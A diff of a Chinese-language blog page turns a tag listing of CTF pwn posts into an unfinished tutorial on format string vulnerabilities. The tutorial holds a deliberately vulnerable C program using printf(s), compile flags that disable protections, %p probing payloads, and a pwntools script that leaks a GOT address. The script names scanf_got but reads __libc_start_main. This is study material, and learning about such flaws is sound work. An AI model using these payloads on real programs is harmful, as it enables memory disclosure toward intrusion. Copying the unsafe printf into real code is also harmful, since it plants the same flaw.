@@ -30,30 +30,23 @@
       
         <div class="animated fadeInLeft" style="animation-delay: 0.4s">
           <p class="my-4 text-gray-600 font-light hidden lg:block">
-            我是一个热爱信息安全和记录生活的普通人，一位CTF入门者，编程语言使用者，一位极客追逐者。
+            文章目录
           </p>
-          <div class="animated fadeInLeft social-container hidden lg:block" style="animation-delay: 0.6s">
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
-              
-            
+          <div class="toc-container hidden lg:block">
+            <ul class="markdownIt-TOC">
+<li><a href="#%E6%B3%84%E9%9C%B2%E5%86%85%E5%AD%98">泄露内存</a>
+<ul>
+<li><a href="#%E6%B3%84%E9%9C%B2%E6%A0%88%E5%86%85%E5%AD%98">泄露栈内存</a>
+<ul>
+<li><a href="#%E8%8E%B7%E5%8F%96%E6%A0%88%E5%8F%98%E9%87%8F%E7%9A%84%E6%95%B0%E5%80%BC">获取栈变量的数值</a></li>
+<li><a href="#%E8%8E%B7%E5%8F%96%E6%A0%88%E5%8F%98%E9%87%8F%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2">获取栈变量的字符串</a></li>
+</ul>
+</li>
+<li><a href="#%E6%B3%84%E9%9C%B2%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%85%E5%AD%98">泄露任意地址内存</a></li>
+</ul>
+</li>
+</ul>
+
           </div>
         </div>
       
@@ -97,123 +90,84 @@
 </div>
 <div class="mask" onclick="closeMenu()">
 </div>
-      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4">
-        <h2 class="text-lg text-gray-700 mb-8">
-          <i class="ri-bookmark-line"></i> 栈溢出
-        </h2>
-        
-  <section class="post-item md:flex pb-12 animated fadeIn" :style="{ 'animation-delay': `${0 * 0.2}s` }">
-    
-      <a href="https://zhangzy999.github.io/post/gong-fang-shi-jie-pwn-xin-shou-qu-int_overflow/" class="feature-image-wrapper bg-gray-100 rounded-lg flex-shrink-0 mr-8 w-full h-56 h-32 md:w-56 md:h-40">
-        <div class="post-feature-image lazy w-full h-56 h-32 md:w-56 md:h-40" data-bg="'https://zhangzy999.github.io//post-images/gong-fang-shi-jie-pwn-xin-shou-qu-int_overflow.jpg'">
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">格式化字符串漏洞学习总结(未完)</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2020-06-06 / 2 min read
         </div>
-      </a>
-    
-    <div class="content">
-      <a href="https://zhangzy999.github.io/post/gong-fang-shi-jie-pwn-xin-shou-qu-int_overflow/">
-        <h2 class="post-title text-xl font-extrabold mt-5 md:mt-0">攻防世界pwn新手区—int_overflow</h2>
-      </a>
-      <div class="post-abstract text-gray-700 font-light my-4">
         
-      </div>
-      <div class="text-gray-400 text-sm font-light">2020-06-01 / 4 min read</div>
-    </div>
-  </section>
+        <div class="post-content yue">
+          <p>从ctfwiki上学习了一波，来总结一下（推荐看ctfwiki，很详细，但是看完适合自己总结，第二遍看的时候就有些冗余了）</p>
+<h1 id="泄露内存">泄露内存</h1>
+<h2 id="泄露栈内存">泄露栈内存</h2>
+<p>关于栈内存的泄露比较简单，不多说了</p>
+<h3 id="获取栈变量的数值">获取栈变量的数值</h3>
+<h3 id="获取栈变量的字符串">获取栈变量的字符串</h3>
+<h2 id="泄露任意地址内存">泄露任意地址内存</h2>
+<p>看实例程序</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+int main() {
+  char s[100];
+  int a = 1, b = 0x22222222, c = -1;
+  scanf(&quot;%s&quot;, s);
+  printf(&quot;%08x.%08x.%08x.%s\n&quot;, a, b, c, s);
+  printf(s);     //这个地方显然有格式化字符串漏洞
+  return 0;
+}
+</code></pre>
+<p>编译一下</p>
+<pre><code>gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c
+</code></pre>
+<p>泄露指定地址的方法：</p>
+<pre><code>addr%k$s
+</code></pre>
+<p>确定字符串为几个参数的方法：</p>
+<pre><code>AAAA%p%p%p%p%p%p%p%p%p%p%p%p
+</code></pre>
+<p>我们设置一个可访问的地址，用scanf@got来举例子拿到scanf的地址（一般不泄露printf函数的地址，自己实操一下即可）<br>
+第一步，拿到scanf@got的地址（可有可无）<br>
+<img src="https://zhangzy999.github.io//post-images/1591436467954.png" alt="" loading="lazy"><br>
+第二步，判断是<strong>格式化字符串</strong>的第几个参数<br>
+通过%p的那种形式可以判断出来是格式化字符串的第四个参数<br>
+<img src="https://zhangzy999.github.io//post-images/1591436474937.png" alt="" loading="lazy"><br>
+第三步，写payload</p>
+<pre><code class="language-python">from pwn import *
 
-  <section class="post-item md:flex pb-12 animated fadeIn" :style="{ 'animation-delay': `${1 * 0.2}s` }">
-    
-      <a href="https://zhangzy999.github.io/post/ad5_guess_num/" class="feature-image-wrapper bg-gray-100 rounded-lg flex-shrink-0 mr-8 w-full h-56 h-32 md:w-56 md:h-40">
-        <div class="post-feature-image lazy w-full h-56 h-32 md:w-56 md:h-40" data-bg="'https://zhangzy999.github.io//post-images/ad5_guess_num.jpg'">
+filename = './format_string_1_leakmemory'
+sh = process(filename)
+elf = ELF(filename)
+
+scanf_got = elf.got['__libc_start_main']
+payload = p32(scanf_got) + '%4$s'
+
+sh.sendline(payload)
+
+sh.recvuntil('%4$s')
+print hex(u32(sh.recv()[4:8]))
+</code></pre>
+<p>然后就拿到了scanf的地址</p>
+
         </div>
-      </a>
-    
-    <div class="content">
-      <a href="https://zhangzy999.github.io/post/ad5_guess_num/">
-        <h2 class="post-title text-xl font-extrabold mt-5 md:mt-0">攻防世界pwn新手区—guess_num</h2>
-      </a>
-      <div class="post-abstract text-gray-700 font-light my-4">
-        
-      </div>
-      <div class="text-gray-400 text-sm font-light">2020-06-01 / 6 min read</div>
-    </div>
-  </section>
 
-  <section class="post-item md:flex pb-12 animated fadeIn" :style="{ 'animation-delay': `${2 * 0.2}s` }">
-    
-      <a href="https://zhangzy999.github.io/post/ad_world_level2/" class="feature-image-wrapper bg-gray-100 rounded-lg flex-shrink-0 mr-8 w-full h-56 h-32 md:w-56 md:h-40">
-        <div class="post-feature-image lazy w-full h-56 h-32 md:w-56 md:h-40" data-bg="'https://zhangzy999.github.io//post-images/ad_world_level2.jpg'">
+        
+
+
+        <div class="flex justify-between py-8">
+          
+
+          
+            <div class="next-post">
+              <a href="https://zhangzy999.github.io/post/gong-fang-shi-jie-pwn-xin-shou-qu-int_overflow/">
+                <h3 class="post-title">
+                  攻防世界pwn新手区—int_overflow
+                  <i class="ri-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
+          
         </div>
-      </a>
-    
-    <div class="content">
-      <a href="https://zhangzy999.github.io/post/ad_world_level2/">
-        <h2 class="post-title text-xl font-extrabold mt-5 md:mt-0">攻防世界pwn新手区—level2</h2>
-      </a>
-      <div class="post-abstract text-gray-700 font-light my-4">
-        
-      </div>
-      <div class="text-gray-400 text-sm font-light">2020-05-31 / 2 min read</div>
-    </div>
-  </section>
 
-  <section class="post-item md:flex pb-12 animated fadeIn" :style="{ 'animation-delay': `${3 * 0.2}s` }">
-    
-      <a href="https://zhangzy999.github.io/post/adworld_level0/" class="feature-image-wrapper bg-gray-100 rounded-lg flex-shrink-0 mr-8 w-full h-56 h-32 md:w-56 md:h-40">
-        <div class="post-feature-image lazy w-full h-56 h-32 md:w-56 md:h-40" data-bg="'https://zhangzy999.github.io//post-images/adworld_level0.jpg'">
-        </div>
-      </a>
-    
-    <div class="content">
-      <a href="https://zhangzy999.github.io/post/adworld_level0/">
-        <h2 class="post-title text-xl font-extrabold mt-5 md:mt-0">攻防世界pwn新手区—level0</h2>
-      </a>
-      <div class="post-abstract text-gray-700 font-light my-4">
         
-      </div>
-      <div class="text-gray-400 text-sm font-light">2020-05-29 / 1 min read</div>
-    </div>
-  </section>
-
-  <section class="post-item md:flex pb-12 animated fadeIn" :style="{ 'animation-delay': `${4 * 0.2}s` }">
-    
-      <a href="https://zhangzy999.github.io/post/adworld_hello_pwn/" class="feature-image-wrapper bg-gray-100 rounded-lg flex-shrink-0 mr-8 w-full h-56 h-32 md:w-56 md:h-40">
-        <div class="post-feature-image lazy w-full h-56 h-32 md:w-56 md:h-40" data-bg="'https://zhangzy999.github.io//post-images/adworld_hello_pwn.jpg'">
-        </div>
-      </a>
-    
-    <div class="content">
-      <a href="https://zhangzy999.github.io/post/adworld_hello_pwn/">
-        <h2 class="post-title text-xl font-extrabold mt-5 md:mt-0">攻防世界pwn新手区—hello_pwn</h2>
-      </a>
-      <div class="post-abstract text-gray-700 font-light my-4">
-        
-      </div>
-      <div class="text-gray-400 text-sm font-light">2020-05-28 / 2 min read</div>
-    </div>
-  </section>
-
-  <section class="post-item md:flex pb-12 animated fadeIn" :style="{ 'animation-delay': `${5 * 0.2}s` }">
-    
-      <a href="https://zhangzy999.github.io/post/pwn_adworld_birth/" class="feature-image-wrapper bg-gray-100 rounded-lg flex-shrink-0 mr-8 w-full h-56 h-32 md:w-56 md:h-40">
-        <div class="post-feature-image lazy w-full h-56 h-32 md:w-56 md:h-40" data-bg="'https://zhangzy999.github.io//post-images/pwn_adworld_birth.jpg'">
-        </div>
-      </a>
-    
-    <div class="content">
-      <a href="https://zhangzy999.github.io/post/pwn_adworld_birth/">
-        <h2 class="post-title text-xl font-extrabold mt-5 md:mt-0">解决的第一个pwn题目—攻防世界新手区：when_did_you_born</h2>
-      </a>
-      <div class="post-abstract text-gray-700 font-light my-4">
-        
-      </div>
-      <div class="text-gray-400 text-sm font-light">2020-05-27 / 2 min read</div>
-    </div>
-  </section>
-
-        <div class="pagination-container animated fadeIn">
-  
-  
-</div>
 
       </div>
     </div>
